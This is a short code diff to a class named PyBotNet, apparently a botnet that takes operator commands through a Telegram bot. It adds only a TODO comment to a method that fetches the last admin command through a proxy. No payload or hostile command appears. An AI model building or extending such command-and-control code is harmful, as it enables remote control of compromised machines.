@@ -58,6 +58,7 @@ class PyBotNet:
 
     def get_last_command_by_third_party_proxy(self):
         '''return last admin message or False'''
+        #TODO : it is better to dont run this function every time when running.
         return util.get_last_admin_command_by_third_party_proxy(
             self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN,
             self.previous_update_id, self.logger)
